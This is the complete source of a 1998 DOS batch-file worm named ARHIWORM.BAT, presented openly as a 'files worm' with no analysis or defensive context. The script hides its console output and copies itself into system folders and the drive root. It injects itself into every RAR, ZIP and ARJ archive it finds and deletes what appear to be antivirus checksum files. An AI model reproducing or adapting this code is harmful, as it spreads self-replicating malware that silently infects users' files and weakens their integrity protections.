@ctty nul
if "%1"=="-rar" goto rar
if "%1"=="-zip" goto zip
if "%1"=="-arj" goto arj
copy %0 c:\dos\%0
copy %0 c:\windows\%0
copy %0 c:\win95\%0
copy %0 c:\%0
copy %0 ..\%0
for %%r in (*.rar) do call %0 -rar %%r
for %%z in (*.zip) do call %0 -zip %%z
for %%a in (*.arj) do call %0 -arj %%a
del chklist.*
goto end
:rar
attrib -r %2
rar a -tk -y -c- -o+ %2 %0
goto end
:zip
attrib -r %2
pkzip -m %2 %0
goto end
:arj
attrib -r %2
arj a -d %2 %0
:end
ctty con
@rem ARHIWORM.BAT v2.0 - files worm  (c) by Duke [SMF] 9.06.98
